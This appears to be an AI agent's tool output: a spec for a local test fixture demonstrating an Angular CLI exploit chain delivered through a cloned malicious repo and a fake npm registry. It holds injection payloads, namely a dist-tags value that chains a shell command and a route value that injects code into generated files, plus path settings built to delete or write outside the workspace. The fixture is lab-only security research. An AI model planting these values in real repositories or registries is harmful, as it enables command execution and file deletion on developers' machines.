All reference shapes read (W1 Windows fixture spec, M2/M3 evidence layouts). Producing the Chain 1 fixture SPEC:

```markdown
# Chain 1 — Cloned-repo delivery chain: end-to-end fixture SPEC (E2-R1/C1D)

Goal: one attacker-authored Angular repo + one synthetic registry that, when the dev follows the
README, demonstrates W1 (pre-gate cmd/RCE hop), M3 (outputPath delete + case-guard variant),
D2 (cache purge), E1-C1 (i18n locale-key write escape), and D1 (route codegen) — with a benign
negative-control repo and a driver that asserts per-step observables. Local/synthetic only.

## (a) Synthetic registry — a tiny Node http server (~80 lines, `registry-server.mjs`)

Pick the SIMPLEST that supports dist-tags + tarball metadata: a single-file `node:http` server
(no Verdaccio dependency; Verdaccio adds npm-auth/streaming complexity for zero gain here).

Routes served:
- `GET /attacker-pkg` → packument JSON:
  `{"name":"attacker-pkg","dist-tags":{"latest":"1.0.0\" & echo W1-MARKER>%TEMP%\\w1-poc & \""},"versions":{"1.0.0":{"name":"attacker-pkg","version":"1.0.0","dist":{"tarball":"http://127.0.0.1:<port>/attacker-pkg/-/attacker-pkg-1.0.0.tgz"}}},"time":{"1.0.0":"2026-01-01T00:00:00Z"}}`
  (marker uses echo-file instead of calc for CI-friendliness; `%TEMP%` quoted-path note: keep the
  value single-quoted in the JSON so the quote-wrap hop is exercised — the double-quote that the
  CLI wraps with closes and `&` chains).
- `GET /attacker-pkg/-/attacker-pkg-1.0.0.tgz` → a minimal pre-built tarball (empty package,
  generated once with `npm pack` or tar at fixture-build time, 2-4 KB).
- `GET /@angular%2fcommon` (+ tarball) → OPTIONAL (E1-C1 member C lane): packument for the
  "attacker-controlled @angular/common" that member C's resolution walk can hit; the base chain
  does NOT need it (the write-escape demonstration is member A-side).
- Anything else → 404 (npm/yarn may probe; log and return 404 — do not proxy to the real npm).
- **Registry log**: every request line appended to `registry.log` (method, path, query, the raw
  `dist-tags.latest` value served). This is the W1 hop's in-lab observable (see (e)).
Server binds 127.0.0.1 only; port configurable; clean shutdown via SIGTERM; no auth.

## (b) Malicious repo layout (`malrepo/`)

```
malrepo/
  .npmrc            # registry=http://127.0.0.1:<port>/
  .yarnrc           # yarn-1 syntax: --registry http://127.0.0.1:<port>/
                    #   (NOT bare `registry http://...` — Yarn 1 config semantics, per W1 fixture spec)
  yarn.lock         # minimal entry for attacker-pkg@^1.0.0 -> forces yarn-classic detection
                    #   (factory.ts:99-107 major<2; a yarn 2+ binary silently falls to yarn-modern = no W1)
  package.json      # {"name":"malrepo","private":true,"dependencies":{"attacker-pkg":"^1.0.0"}}
  angular.json      # workspace config carrying the 4 malicious values (below)
  src/main.ts, src/index.html, src/styles.css   # minimal app files (hand-written, no ng new)
  README.md         # the "dev workflow" instructions (clone -> install -> add -> build -> generate)
```
`angular.json` malicious values (one per hop):
- `cli.cache.path` → `"../victim-cache"` (D2: purgeStaleBuildCache on every build + `ng cache clean`).
- `projects.app.architect.build` (browser builder) `options.outputPath` → `"../victim-out"` (M3:
  deleteOutputDir at build start; legacy webpack builder path — uncontained at the pin).
- `projects.app.architect.build.options.i18n.locales` → `{ "../../escaped-locale": {"translation": "src/locale.json"} }`
  (E1-C1: locale KEY unvalidated → webpack output write escapes the output base; also exercise the
  string-form `i18n.sourceLocale` variant).
- `projects.app.schematics["@schematics/angular:module"].route` → the D1 payload
  `x"));console.log("D1-MARKER");//` (D1: workspace schematics-defaults channel — reachable with
  NO `--route` flag per L7; the comma-exec variant is documented as the compiled-verified payload,
  the console.log variant is the safe in-fixture observable).
- Case-guard variant (optional lane): a second fixture repo `malrepo-case/` with
  `outputPath` = case-variant of the workspace root (e.g. `MalRepo/` for root `malrepo-case/`) —
  macOS APFS root-guard bypass (M3 amp #1); expected on macOS, negative on Linux.

## (c) Driver script (`run-chain1.mjs`, assert-per-step)

Preconditions: pin-built `@angular/cli` (local dist, NOT fetched from the registry); Node 24;
optional Yarn 1.x on PATH (W1 hop); registry server started (port from env).

| # | Step | Command (cwd=malrepo) | Expected observable (asserted) |
|---|---|---|---|
| 1 | fetch metadata | `ng add attacker-pkg` | **W1 hop**: registry.log shows the metadata fetch with the RAW malicious dist-tags value in the requested specifier (pre-gate, before confirmation). In-lab (POSIX): no exec (array-spawn) — asserted as no marker; on Windows: `%TEMP%\w1-poc` created BEFORE any install/confirmation (cmd.exe chained). Assert: log line present + (win) marker file exists |
| 2 | build (delete) | `ng build` | **M3**: `../victim-out` dir's marker file DELETED (deleteOutputDir ran at build start). **D2**: `../victim-cache` marker DELETED (purgeStaleBuildCache). **E1-C1**: `../../escaped-locale` dir CREATED with locale output files outside the output base. Assert all three |
| 3 | generate (codegen) | `ng generate module lazy` (NO --route flag) | **D1**: generated `lazy-routing.module.ts` contains the injected `console.log("D1-MARKER")` expression (schematics-defaults channel). Assert: grep hit |
| 4 | cache clean | `ng cache clean` | **D2**: `../victim-cache` marker DELETED (explicit command path). Assert |
| 5 | case-guard (optional) | `ng build` in `malrepo-case/` | **M3 amp #1**: workspace root contents DELETED on case-insensitive APFS (macOS); on Linux assert NO deletion (ENOENT early-return). Assert per-platform |
| 6 | bundle content | read `dist/app/main.*.js` | E1-C1 member-C/attacker-content check (if the optional @angular/common lane is enabled): attacker marker string present in the bundle. Otherwise: assert bundle built (write-escape already asserted in step 2) |

Driver writes `chain1-results.json` (step, expected, actual, pass/fail, exit codes) and exits
nonzero on any failed assertion. A `--negative` flag runs the same steps against `goodrepo/` and
asserts the inverse (below).

## (d) Negative control repo (`goodrepo/`) — same driver, benign values

- `.npmrc`/`.yarnrc`: point at the SAME registry but the registry serves `attacker-pkg` with a
  VALID `"dist-tags":{"latest":"1.0.0"}` (no quote/ampersand) — W1 negative.
- `angular.json`: `outputPath: "dist/app"`, `cli.cache.path: ".angular/cache"`, locale key `"en"`,
  schematics defaults with a benign route `"lazy"` — M3/D2/E1-C1/D1 negatives.
- Assertions: NO W1 marker (log value benign), NO deletion outside the workspace
  (victim-out/victim-cache marker files remain), NO escaped-locale dir, generated file has NO
  D1-MARKER (benign route interpolation). All negative asserts must pass.

## (e) Win32 wiring + in-lab limitation (declared)

- W1's cmd.exe execution cannot fire in-lab (Darwin/arm64, no Windows layer — verified blocker).
  The fixture WIRES the hop anyway: (1) the registry log records the exact specifier string the
  CLI built from the dist-tags value (proves the raw value reached the command builder pre-gate);
  (2) the driver documents the static walkthrough (quote-wrap host.ts:110 → shell:true
  host.ts:157-164); (3) on any Windows host the identical driver produces the marker file — the
  fixture is the operator's one command away from the live rung (mirrors WINDOWS-E2E-FIXTURE.md).
- yarn-1 absence in-lab: version-detection check (`yarn --version` major) is reported; if yarn 1
  is absent the W1 hop is logged specifier-level only and the report states it.

## (f) Cleanup ledger entries (fixture-build time; applied at closure)

| Artifact | Disposition |
|---|---|
| `/tmp/chain1-fixture/` (registry-server.mjs, malrepo/, goodrepo/, driver, results) | delete (closure); evidence copies → findings/…/evidence/chain1/ as decided by the orchestrator |
| registry server process (127.0.0.1:<port>) | SIGTERM at driver exit; no residual process |
| `malrepo-case/` variant dir | delete (closure) |
| `%TEMP%\w1-poc` (only if run on Windows) | delete after capture |
| vendor tgz (`attacker-pkg-1.0.0.tgz`) | keep with evidence; no credentials |
```
</｜｜DSML｜｜parameter>
</｜｜DSML｜｜invoke>
</｜｜DSML｜｜tool_calls>
